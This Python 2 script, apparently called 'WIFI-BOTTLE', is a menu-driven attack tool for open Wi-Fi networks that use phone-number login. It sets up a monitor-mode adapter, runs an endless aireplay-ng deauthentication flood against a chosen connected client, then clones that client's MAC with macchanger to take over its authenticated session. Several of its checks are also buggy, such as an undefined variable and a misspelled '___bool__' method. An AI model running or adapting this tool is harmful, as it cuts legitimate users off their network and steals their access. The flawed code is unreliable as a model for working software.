# -*- coding: utf-8 -*-
"""
##########################
license:           gnu 3.0
contact: vk.com/id27919760
##########################
   ,--,          ,--,
   )""(          )""(
  /    \        .%nn%.
 /      \      /%%%%%%\
.        .    .%%%%%%%%.
|`-....-'|    |"*%%%%*"|
|        |    |        |
|        |    |        |
|`-....-'|    |8n....n8|
|        |    |%%%%%%%%|
|        |    |%%%%%%%%|
 `-....-'      "*%%%%*" 
       WIFI-BOTTLE
for open wifi network with
   telephone number auth
###########################
"""
import os, subprocess, sys

class Process:
	def __init__(self, cmd):
		self.process = subprocess.Popen(cmd.split(),stdout=subprocess.PIPE,shell = False)

	def run(self, **kwargs):
		try:
			self.output, self.error = self.process.communicate(**kwargs)
		except ValueError:
			pass
		return self.output

class Method:
	current = u"force"
	def __str__(self):
		return self.current
	
	def force(self,station,client,adapter):
		try:
			os.system("aireplay-ng --deauth 0 -a {} -c {} {} --ignore-negative-one".format(station.mac,client.mac,adapter.mon))
		except:
			pass
		finally:
			return True

	def use(self,*args):
		return getattr(self,self.current)(*args)
		
class Client:
	mac = u""
	def __bool__(self):
		return bool(mac)
		
	def __str__(self):
		if self:
			return self.mac
		else:
			return u"not setted"
		
	def choice(self,station,adapter):
		try:
			os.system(u"airodump-ng -c {} --bssid {} {} --ignore-negative-one".format(station.channel,station.mac,adapter.mon))
		except:
			pass
		finally:
			return True
		
	def set(self):
		self.mac = ""
		while not self.mac:
			mac = raw_input("Client MAC(aa:aa:aa:aa:aa:aa):> ")
			if len(mac.split(":"))	== 6:
				for seg in mac.split(":"):
					if not len(seg) == 2:
						mac = ""
				if mac:
					self.mac = mac
			else:
				mac = ""

class Adapter:
	adapter_directory = "/proc/net/dev_snmp6"
	phy = ""
	name = ""
	mon = ""
	orig_mac = ""
	fake_mac = ""
	
	def __str__(self):
		if self:
			return u"{} ({})".format(self.name,self.mon)
		else:
			return u"not setted"
	
	def __bool__(self):
		return self.name and self.mon

	def set_adapter(self):
		while not self.name:
			print os.listdir(self.adapter_directory)
			name = raw_input("Enter Connected Adapter:> ")
			if name in os.listdir(self.adapter_directory):
				self.name = name
		return True

	def set_monitor(self):
		while not self.mon:
			print os.listdir(self.adapter_directory)
			mon = raw_input("Enter Monitor Adapter:> ")
			if mon in os.listdir(self.adapter_directory):
				self.mon = mon
		return True

	def up(self):
		self.set_adapter()
		os.system("airmon-ng check {}".format(self.name))
		os.system("airmon-ng check kill") if not raw_input("press ENTER to kill process") else None
		os.system("airmon-ng start {}".format(self.name))
		self.set_monitor()
		return True

	def down(self):
		if not self:
			self.set_adapter()
			self.set_monitor()
		os.system("airmon-ng stop {}".format(self.mon))
		os.system("ip link set {} up".format(self.name))
		#if use systemctl bois shit
		os.system("systemctl start NetworkManager")
		return True

class Station:
	name = ""
	mac = ""
	channel = 0
	
	def save(self):
		return u"~{}~{}~{}~".format(self.name,self.mac,self.channel)

	#def load(self)

	def __str__(self):
		if self:
			return u"{} ({})({})".format(self.name,self.mac,self.channel)
		else:
			return u"not allocate"
			
	def ___bool__(self):
		return self.name and self.mac and self.channel
	
	def run(self,monitor):
		if not monitor:
			print "Please Set Adapter"
			return False
		else:
			try:
				os.system("airodump-ng {}".format(monitor))
			except:
				pass
			finally:
				return True
	
	def set(self):
		self.name = ""
		while not self.name:
			self.name = raw_input("Station Name:> ")
		self.mac = ""
		while not self.mac:
			mac = raw_input("Station BSSID(aa:aa:aa:aa:aa:aa):> ")
			if len(mac.split(":"))	== 6:
				for seg in mac.split(":"):
					if not len(seg) == 2:
						mac = ""
				if mac:
					self.mac = mac
			else:
				mac = ""
		self.channel = 0
		while not self.channel:
			try:
				channel = int(raw_input("Station Channel:> "))
			except:
				channel = 0
				pass
			finally:
				if channel > 0 and channel < 14:
					self.channel = channel
				else:
					print "Enter Validate Channel 1..13"

class Main:
	station = Station()
	adapter = Adapter()
	method = Method()
	client = Client()
	
	def menu(self):
		status = u"""
###########################################
Adapter: {}\t\t\t\tMethod: {}
Station: {}\t\t\t\nClient: {}
"""
		menu = u"""
1.Set Adapter
2.Set Method
3.Set Station
4.Set Client
5.Attack
6.Attack & Connect (attack & exit)
7.Attack & Connect Other Adapter on this pc
100.Exit
"""
		print status.format(self.adapter,self.method,self.station,self.client)
		print menu
	def main(self):
		choice = 0
		while True:
			self.menu()
			try:
				while not choice:
					try:
						choice = int(raw_input("MENU:> "))
					except:
						choice = 0
				
				if choice == 1:
					#self.adapter.
					#print "uses default values"
					self.adapter.up()
				elif choice == 2:
					print "one method allow"
				elif choice == 3:
					if self.adapter:
						self.station.run(self.adapter.mon)
						self.station.set()
					else:
						print "Set Adapter"
				elif choice == 4:
					if self.station:
						self.client.choice(self.station,self.adapter)
						self.client.set()
					else:
						print "Set Station"
				elif choice == 5:
					if self.client:
						self.method.use(self.station,self.client,self.adapter)
					else:
						print "Set Client"
				elif choice == 6:
					if not self.client:
						print "Set Client"
					if not self.adapter:
						print "Set Adapter"

					self.method.use(self.station,self.client,self.adapter)
					os.system("macchanger --mac {} {}".format(self.client.mac,self.adapter.name))
					self.adapter.down()
					sys.exit()
				elif choice == 7:
					if not self.client:
						print "Set Client"
					other_adapter = Adapter()
					other_adapter.set_adapter()
					os.system("macchanger --mac {} {}".format(self.client.mac,self.other_adapter.name))
					while not raw_input("press ENTER to start disconnect client\nenter any words to abort"):
						self.method.use(self.station,self.client,self.adapter)

				elif choice == 100:
					self.adapter.down() if self.adapter and not raw_input(u"press ENTER to return devices states before exit\nenter any words to abort") else None
					sys.exit()
					###########
			except Exception as error:
				print error
				pass
			finally:
				choice = 0


def main():
	root = Main()
	root.main()

if __name__ == "__main__":
	if not os.environ.get('USERNAME') == "root":
		print "run from root"
		sys.exit(1)
	main()
